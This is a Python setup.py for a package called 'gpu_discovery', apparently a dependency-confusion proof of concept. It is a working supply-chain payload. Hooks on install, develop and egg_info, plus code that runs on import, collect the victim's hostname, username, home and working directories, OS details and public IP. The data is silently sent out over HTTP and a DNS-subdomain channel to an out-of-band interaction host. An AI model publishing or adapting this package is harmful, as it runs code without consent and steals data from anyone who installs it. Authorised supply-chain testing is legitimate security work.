from setuptools import setup
from setuptools.command.install import install
from setuptools.command.develop import develop
from setuptools.command.egg_info import egg_info
import socket
import getpass
import os
import json
import base64
import sys
import platform
import time

# BURP Collaborator / Exfil endpoints
BURP_HTTP = "http://dpbaacujrlktevcztpge3u3psdk3zc7pa.oast.fun"  # e.g. http://abc123.oastify.com
BURP_DNS = "dpbaacujrlktevcztpge3u3psdk3zc7pa.oast.fun"       # e.g. abc123.oastify.com

# Helper to fetch public IP address
def get_public_ip():
    try:
        import urllib.request
        return urllib.request.urlopen('https://api.ipify.org', timeout=3).read().decode()
    except:
        return "unknown"

# Core payload
def execute_payload():
    try:
        hostname = socket.getfqdn()
        user = getpass.getuser()
        home_dir = os.path.expanduser("~")
        cwd = os.getcwd()
        system = platform.system()
        release = platform.release()
        machine = platform.machine()
        username = getpass.getuser()
        timestamp = time.strftime('%a %b %d %Y %H:%M:%S %Z', time.gmtime())
        public_ip = get_public_ip()

        # Format similar to Yelp-type callback
        report = f"""[ CALLBACK - {timestamp} ]
originating IP: {public_ip}
hostname: {hostname}
home directory: {home_dir}
directory: {cwd}
user: {username}
platform: {system} {release} ({machine})
python: {sys.version.split()[0]}
------------------------------------------------
"""

        # Print to local console (debugging)
        # print(report)

        # HTTP exfiltration
        try:
            import urllib.request
            import urllib.parse
            payload = urllib.parse.urlencode({
                'h': hostname,
                'u': username,
                'ip': public_ip,
                'home': home_dir,
                'cwd': cwd,
                'ts': timestamp,
                'os': f"{system} {release}",
                'arch': machine,
                'py': sys.version.split()[0],
            })

            full_url = f"{BURP_HTTP}?{payload}"
            urllib.request.urlopen(full_url, timeout=3)
        except:
            pass

        # DNS fallback exfiltration (short ident only)
        try:
            encoded = base64.b32encode((hostname + "-" + username).encode()).decode().lower()
            subdomain = f"{encoded[:50]}.{BURP_DNS}"
            socket.gethostbyname(subdomain)
        except:
            pass

    except Exception as e:
        pass  # Safe fail

# Hooks
class PoCInstall(install):
    def run(self):
        execute_payload()
        install.run(self)

class PoCDevelop(develop):
    def run(self):
        execute_payload()
        develop.run(self)

class PoCEggInfo(egg_info):
    def run(self):
        execute_payload()
        egg_info.run(self)

# Trigger on import
if __name__ != "__main__":
    execute_payload()

# Package metadata (fake)
setup(
    name='gpu_discovery',
    version='99.99.99',
    description='PoC package for testing internal pip supply chain.',
    cmdclass={
        'install': PoCInstall,
        'develop': PoCDevelop,
        'egg_info': PoCEggInfo,
    },
    install_requires=[],
)